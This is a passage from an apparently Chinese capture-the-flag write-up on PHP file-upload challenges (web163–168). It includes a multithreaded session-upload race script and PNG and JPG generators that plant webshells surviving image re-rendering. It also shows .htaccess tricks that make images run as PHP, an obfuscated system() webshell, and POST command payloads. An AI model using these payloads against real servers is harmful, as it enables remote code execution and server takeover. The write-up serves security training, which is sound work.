auto_prepend_file=/tmp/sess_love
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819212648602.png&#34; alt=&#34;image-20250819212648602&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;脚本实现条件竞争&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250819212528233.png&#34; alt=&#34;image-20250819212528233&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多线程并发注入脚本&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import io
import requests
import threading
import time

# === [1] 靶机地址 ===
url = &amp;#39;http://68227ebf-cab1-4403-9a8c-86cda1177f67.challenge.ctf.show/&amp;#39;

# === [2] 自定义参数 ===
PHPSESSID = &amp;#39;love&amp;#39;
PAYLOAD = &amp;#39;&amp;lt;?php system(&amp;quot;tac ../flag.php&amp;quot;);?&amp;gt;aaaaa&amp;#39;   # 修改命令，自定义标识符
IDENTIFIER = &amp;#39;aaaaa&amp;#39;  # 在回显里找 aaaaa; 用于判断是否成功执行
TARGET_SESS_PATH = &amp;#39;upload/index.php&amp;#39;    # 修改读取地址

# === [3] 线程控制器 ===
found_flag = threading.Event()

# === [4] 上传线程：持续伪造上传进度 ===
def upload_payload(session, thread_id):
    data = &amp;#123;
        &amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;: PAYLOAD
    &amp;#125;

    while not found_flag.is_set():
        try:
            fake_file = io.BytesIO(b&amp;#39;A&amp;#39; * 1024 * 10)  # 10KB 文件
            session.post(
                url,
                cookies=&amp;#123;&amp;#39;PHPSESSID&amp;#39;: PHPSESSID&amp;#125;,
                data=data,
                files=&amp;#123;&amp;#39;file&amp;#39;: (f&amp;#39;upload_&amp;#123;thread_id&amp;#125;.txt&amp;#39;, fake_file)&amp;#125;,
                timeout=3
            )
            print(f&amp;#39;[Upload-&amp;#123;thread_id&amp;#125;] Upload OK&amp;#39;)
        except Exception as e:
            print(f&amp;#39;[Upload-&amp;#123;thread_id&amp;#125;] Error: &amp;#123;e&amp;#125;&amp;#39;)

# === [5] 读取线程：不断读取 sess 文件，等待触发执行 ===
def read_session(session, thread_id):
    while not found_flag.is_set():
        try:
            response = session.get(f&amp;#39;&amp;#123;url&amp;#125;&amp;#123;TARGET_SESS_PATH&amp;#125;&amp;#39;, timeout=2)     # 修改靶机读取地址
            if IDENTIFIER in response.text:
                print(f&amp;#39;\n[+] [Read-&amp;#123;thread_id&amp;#125;] Payload executed successfully!\n&amp;#39;)
                print(response.text)
                found_flag.set()
                break
            else:
                print(f&amp;#39;[-] [Read-&amp;#123;thread_id&amp;#125;] Not ready&amp;#39;)
        except Exception as e:
            print(f&amp;#39;[Read-&amp;#123;thread_id&amp;#125;] Error: &amp;#123;e&amp;#125;&amp;#39;)
        time.sleep(0.2)

# === [6] 主控函数：并发调度线程 ===
def main():
    session = requests.Session()
    threads = []

    # 启动多个上传线程
    for i in range(3):
        t = threading.Thread(target=upload_payload, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 启动多个读取线程
    for i in range(5):
        t = threading.Thread(target=read_session, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 等待直到有线程设置 found_flag
    while not found_flag.is_set():
        time.sleep(0.2)

    print(&amp;quot;\n[+] Done. Exiting all threads.&amp;quot;)

# === [7] 执行入口 ===
if __name__ == &amp;#39;__main__&amp;#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web164&#34;&gt;&lt;a href=&#34;#web164&#34; class=&#34;headerlink&#34; title=&#34;web164&#34;&gt;&lt;/a&gt;web164&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;png&lt;/code&gt; 二次渲染与绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.二次渲染？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;定义&lt;/strong&gt;：当用户上传文件（如图片、文档）后，网站会对文件进行再处理（即二次渲染），以适配显示需求或进行安全过滤。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;常见原因&lt;/strong&gt;：&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;适配展示&lt;/strong&gt;：压缩、缩放图片，转换格式（如 PNG → JPG）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全考虑&lt;/strong&gt;：清理潜在木马代码，防止图片木马、恶意脚本注入。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2.二次渲染的影响&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户上传的原始文件和服务器保存的文件 &lt;strong&gt;并不完全一致&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;如果攻击者直接在文件中写入 Webshell，很可能在渲染过程中被修改或清理掉。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;3.绕过二次渲染的思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）对比差异&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将上传前的源文件与上传后的处理结果进行比对。&lt;/li&gt;
&lt;li&gt;找出哪些数据段被修改、哪些数据段保持不变。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;（2）选择安全区域&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 &lt;strong&gt;不会被二次渲染修改的数据区域&lt;/strong&gt; 插入恶意代码。&lt;/li&gt;
&lt;li&gt;这样上传后的文件仍然包含可执行的后门代码。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;4.需要脚本&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;文件渲染后的差异分布 &lt;strong&gt;复杂且不可预测&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;手工分析、插入代码几乎不可能成功。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;需要使用脚本来自动：&lt;/p&gt;
&lt;p&gt;（1）上传 → 下载已渲染文件&lt;/p&gt;
&lt;p&gt;（2）比对文件差异&lt;/p&gt;
&lt;p&gt;（3）在合适位置自动写入恶意代码&lt;/p&gt;
&lt;p&gt;（4）重新构造“图片马”并循环测试&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看源代码&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820003944731.png&#34; alt=&#34;image-20250820003944731&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;&amp;lt;/div&amp;gt;
&amp;lt;script src=&amp;quot;js/layui.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
layui.use(&amp;#39;upload&amp;#39;, function()&amp;#123;
  var upload = layui.upload;

  //执行实例
  var uploadInst = upload.render(&amp;#123;
    elem: &amp;#39;#upload&amp;#39; //绑定元素
    ,url: &amp;#39;/upload/&amp;#39; //上传接口
    ,done: function(res)&amp;#123;
        if(res.code==0)&amp;#123;
            $(&amp;quot;#result&amp;quot;).html(&amp;quot;文件上传成功 &amp;lt;a href=&amp;#39;download.php?image=&amp;quot;+res.msg+&amp;quot;&amp;#39; target=&amp;#39;_blank&amp;#39;&amp;gt;查看图片&amp;lt;/a&amp;gt;&amp;quot;);
        &amp;#125;else&amp;#123;
            $(&amp;quot;#result&amp;quot;).html(&amp;quot;文件上传失败，失败原因：&amp;quot;+res.msg);
        &amp;#125;

    &amp;#125;
    ,error: function()&amp;#123;
      $(&amp;quot;#result&amp;quot;).html(&amp;quot;文件上传失败&amp;quot;);
    &amp;#125;
  &amp;#125;);
&amp;#125;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以看到源代码有个 &lt;code&gt;download.php?image=&lt;/code&gt;，基本确定考点为二次渲染&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用脚本生成 &lt;code&gt;png&lt;/code&gt; 图，其内容为 &lt;code&gt;&amp;lt;?$_GET[0]($_POST[1]);?&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y &amp;lt; sizeof($p); $y += 3) &amp;#123;
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
&amp;#125;

imagepng($img,&amp;#39;re_encoded.png&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820004455587.png&#34; alt=&#34;image-20250820004455587&#34; style=&#34;zoom: 25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传脚本生成的木马图，查看图片&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
靶机?image=...&amp;amp;0=system

#POST
1=ls
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820004726742.png&#34; alt=&#34;image-20250820004726742&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将图片保存下来，查看图片内容&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820003154047.png&#34; alt=&#34;image-20250820003154047&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
靶机?image=...&amp;amp;0=system

#POST
1=tac flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820004912573.png&#34; alt=&#34;image-20250820004912573&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将图片保存下来，查看图片内容&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820003757010.png&#34; alt=&#34;image-20250820003757010&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web165&#34;&gt;&lt;a href=&#34;#web165&#34; class=&#34;headerlink&#34; title=&#34;web165&#34;&gt;&lt;/a&gt;web165&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;jpg&lt;/code&gt; 二次渲染&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将这张 &lt;code&gt;jpg&lt;/code&gt; 图片上传经过一次渲染后下载下来&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820135624000.png&#34; alt=&#34;image-20250820135624000&#34; style=&#34;zoom:10%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将下载后的 &lt;code&gt;jpg&lt;/code&gt; 图片用脚本进行处理得到二次渲染后的 &lt;code&gt;jpg&lt;/code&gt; 图片&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820135534124.png&#34; alt=&#34;image-20250820135534124&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
    /*
    将 payload 注入到 JPG 图片的算法，可以保证在经过 PHP 函数 imagecopyresized() 和 imagecopyresampled() 转换后仍然保持不变。
    要求：初始图片的大小和质量必须与处理后的图片一致。

    步骤：
    1) 通过安全的文件上传脚本上传任意一张图片；
    2) 保存处理后的图片，然后执行：
    jpg_payload.php &amp;lt;jpg_name.jpg&amp;gt;

    如果注入成功，你会得到一张特殊构造的图片，需要再次上传。

    注意可能的问题：
    1) 经过第二次处理后，注入的数据可能会部分损坏；
    2) jpg_payload.php 脚本输出 &amp;quot;Something&amp;#39;s wrong&amp;quot;。
    如果遇到这种情况，可以尝试修改 payload（例如在开头加一些符号），或者换一张初始图片再试。

    */

    $miniPayload = &amp;#39;&amp;lt;?=eval($_POST[1]);?&amp;gt;&amp;#39;;         # 修改命令


    if(!extension_loaded(&amp;#39;gd&amp;#39;) || !function_exists(&amp;#39;imagecreatefromjpeg&amp;#39;)) &amp;#123;
        die(&amp;#39;php-gd is not installed&amp;#39;);
    &amp;#125;

    if(!isset($argv[1])) &amp;#123;
        die(&amp;#39;php jpg_payload.php &amp;lt;jpg_name.jpg&amp;gt;&amp;#39;);
    &amp;#125;

    set_error_handler(&amp;quot;custom_error_handler&amp;quot;);

    for($pad = 0; $pad &amp;lt; 1024; $pad++) &amp;#123;
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis-&amp;gt;readShort() != 0xFFD8) &amp;#123;
            die(&amp;#39;Incorrect SOI marker&amp;#39;);
        &amp;#125;

        while((!$dis-&amp;gt;eof()) &amp;amp;&amp;amp; ($dis-&amp;gt;readByte() == 0xFF)) &amp;#123;
            $marker = $dis-&amp;gt;readByte();
            $size = $dis-&amp;gt;readShort() - 2;
            $dis-&amp;gt;skip($size);
            if($marker === 0xDA) &amp;#123;
                $startPos = $dis-&amp;gt;seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat(&amp;quot;\0&amp;quot;,$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage(&amp;#39;_&amp;#39;.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) &amp;#123;
                    while((!$dis-&amp;gt;eof())) &amp;#123;
                        if($dis-&amp;gt;readByte() === 0xFF) &amp;#123;
                            if($dis-&amp;gt;readByte !== 0x00) &amp;#123;
                                break;
                            &amp;#125;
                        &amp;#125;
                    &amp;#125;
                    $stopPos = $dis-&amp;gt;seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat(&amp;quot;\0&amp;quot;,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                &amp;#125; elseif($correctImage) &amp;#123;
                    $outStream = $outStreamTmp;
                &amp;#125; else &amp;#123;
                    break;
                &amp;#125;
                if(checkImage(&amp;#39;payload_&amp;#39;.$argv[1], $outStream)) &amp;#123;
                    die(&amp;#39;Success!&amp;#39;);
                &amp;#125; else &amp;#123;
                    break;
                &amp;#125;
            &amp;#125;
        &amp;#125;
    &amp;#125;
    unlink(&amp;#39;payload_&amp;#39;.$argv[1]);
    die(&amp;#39;Something\&amp;#39;s wrong&amp;#39;);

    function checkImage($filename, $data, $unlink = FALSE) &amp;#123;
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    &amp;#125;

    function custom_error_handler($errno, $errstr, $errfile, $errline) &amp;#123;
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match(&amp;#39;/(\d+) extraneous bytes before marker/&amp;#39;, $errstr, $m)) &amp;#123;
            if(isset($m[1])) &amp;#123;
                $extraBytes = (int)$m[1];
            &amp;#125;
        &amp;#125;
    &amp;#125;

    class DataInputStream &amp;#123;
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) &amp;#123;
            $this-&amp;gt;binData = &amp;#39;&amp;#39;;
            $this-&amp;gt;order = $order;
            if(!$fromString) &amp;#123;
                if(!file_exists($filename) || !is_file($filename))
                    die(&amp;#39;File not exists [&amp;#39;.$filename.&amp;#39;]&amp;#39;);
                $this-&amp;gt;binData = file_get_contents($filename);
            &amp;#125; else &amp;#123;
                $this-&amp;gt;binData = $filename;
            &amp;#125;
            $this-&amp;gt;size = strlen($this-&amp;gt;binData);
        &amp;#125;

        public function seek() &amp;#123;
            return ($this-&amp;gt;size - strlen($this-&amp;gt;binData));
        &amp;#125;

        public function skip($skip) &amp;#123;
            $this-&amp;gt;binData = substr($this-&amp;gt;binData, $skip);
        &amp;#125;

        public function readByte() &amp;#123;
            if($this-&amp;gt;eof()) &amp;#123;
                die(&amp;#39;End Of File&amp;#39;);
            &amp;#125;
            $byte = substr($this-&amp;gt;binData, 0, 1);
            $this-&amp;gt;binData = substr($this-&amp;gt;binData, 1);
            return ord($byte);
        &amp;#125;

        public function readShort() &amp;#123;
            if(strlen($this-&amp;gt;binData) &amp;lt; 2) &amp;#123;
                die(&amp;#39;End Of File&amp;#39;);
            &amp;#125;
            $short = substr($this-&amp;gt;binData, 0, 2);
            $this-&amp;gt;binData = substr($this-&amp;gt;binData, 2);
            if($this-&amp;gt;order) &amp;#123;
                $short = (ord($short[1]) &amp;lt;&amp;lt; 8) + ord($short[0]);
            &amp;#125; else &amp;#123;
                $short = (ord($short[0]) &amp;lt;&amp;lt; 8) + ord($short[1]);
            &amp;#125;
            return $short;
        &amp;#125;

        public function eof() &amp;#123;
            return !$this-&amp;gt;binData||(strlen($this-&amp;gt;binData) === 0);
        &amp;#125;
    &amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将二次渲染的 &lt;code&gt;jpg&lt;/code&gt; 图片上传&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;1=system(&amp;quot;ls &amp;gt; 1.txt&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820113228183.png&#34; alt=&#34;image-20250820113228183&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/1.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820113138020.png&#34; alt=&#34;image-20250820113138020&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POST并抓包&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;1=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820114058648.png&#34; alt=&#34;image-20250820114058648&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 BurpSuite 中可查看回显flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820114022894.png&#34; alt=&#34;image-20250820114022894&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web166&#34;&gt;&lt;a href=&#34;#web166&#34; class=&#34;headerlink&#34; title=&#34;web166&#34;&gt;&lt;/a&gt;web166&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;查看源代码，上传文件类型为 &lt;code&gt;zip&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820142602579.png&#34; alt=&#34;image-20250820142602579&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;zip&lt;/code&gt; 文件，同时抓包，在BurpSuite里查看回显&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820143914089.png&#34; alt=&#34;image-20250820143914089&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问上传的页面，进行命令执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/upload/download.php?file=d8d1765751f2bb304893c0cf64322205.zip

a=system(&amp;quot;ls ../&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820143750984.png&#34; alt=&#34;image-20250820143750984&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/upload/download.php?file=d8d1765751f2bb304893c0cf64322205.zip

a=system(&amp;quot;tac ../flag.php&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820143820666.png&#34; alt=&#34;image-20250820143820666&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web167&#34;&gt;&lt;a href=&#34;#web167&#34; class=&#34;headerlink&#34; title=&#34;web167&#34;&gt;&lt;/a&gt;web167&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;.user.ini&lt;/code&gt; 可以用于多种服务器，但前提是同级目录下必须有一个php文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;.htaccess&lt;/code&gt; 文件（只能用于 Apache 服务器）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;定义&lt;/strong&gt;：&lt;code&gt;.htaccess&lt;/code&gt;（Hypertext Access）是 &lt;strong&gt;Apache Web 服务器&lt;/strong&gt;中的一种&lt;strong&gt;分布式配置文件&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;作用范围&lt;/strong&gt;：它对&lt;strong&gt;所在目录&lt;/strong&gt;及其子目录生效。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优先级&lt;/strong&gt;：配置优先级低于 Apache 主配置文件 &lt;code&gt;httpd.conf&lt;/code&gt;，但可以用来做目录级别的灵活控制。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;常见功能&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.网页跳转（301&amp;#x2F;302）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于把旧页面永久&amp;#x2F;临时重定向到新页面。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;Redirect 301 /old-page.html http://example.com/new-page.html
Redirect 302 /temp-page.html http://example.com/temporary.html
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2.自定义错误页面&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可以指定 404、403、500 等错误的自定义页面。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;ErrorDocument 404 /404.html
ErrorDocument 403 /forbidden.html
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3.&lt;strong&gt;修改文件扩展名对应的 MIME 类型&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;比如把 &lt;code&gt;.php5&lt;/code&gt; 文件当作 PHP 解析：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;AddType application/x-httpd-php .php5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;4.访问控制（白名单&amp;#x2F;黑名单）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;禁止特定 IP 访问：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;Deny from 192.168.1.100
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;只允许特定 IP 访问：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;Order deny,allow
Deny from all
Allow from 192.168.1.101
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;5.禁止目录列表&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果目录中没有 &lt;code&gt;index.html&lt;/code&gt;，默认 Apache 会列出目录内容。&lt;/li&gt;
&lt;li&gt;可以关闭：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;Options -Indexes
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;6.设置默认首页&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定义访问目录时的默认文件：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;DirectoryIndex index.php index.html
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;7.URL 重写（Rewrite）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需要启用 &lt;code&gt;mod_rewrite&lt;/code&gt; 模块，常用于伪静态、SEO 优化：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;RewriteEngine On
RewriteRule ^article/([0-9]+)$ article.php?id=$1 [L]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;AddType application/x-httpd-php .jpg   //将.jpg后缀的文件解析 成php

SetHandler application/x-httpd-php    //将所有文件都解析为 php 文件
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;制作 &lt;code&gt;png&lt;/code&gt; 图片，内容为 &lt;code&gt;AddType application/x-httpd-php .jpg&lt;/code&gt; ，上传并抓包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 BurpSuite 中修改文件名为 &lt;code&gt;.htaccess&lt;/code&gt; 后 &lt;code&gt;Send&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820164020304.png&#34; alt=&#34;image-20250820164020304&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传木马图 &lt;code&gt;png&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820164042560.png&#34; alt=&#34;image-20250820164042560&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命令执行&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;# GET
/upload/1.jpg

# POST
a=system(&amp;quot;tac ../flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250820163944646.png&#34; alt=&#34;image-20250820163944646&#34; style=&#34;zoom: 25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web168&#34;&gt;&lt;a href=&#34;#web168&#34; class=&#34;headerlink&#34; title=&#34;web168&#34;&gt;&lt;/a&gt;web168&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;制作内容如下的 &lt;code&gt;png&lt;/code&gt; 图片&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$a = &amp;quot;s#y#s#t#e#m&amp;quot;;
$b = explode(&amp;quot;#&amp;quot;,$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
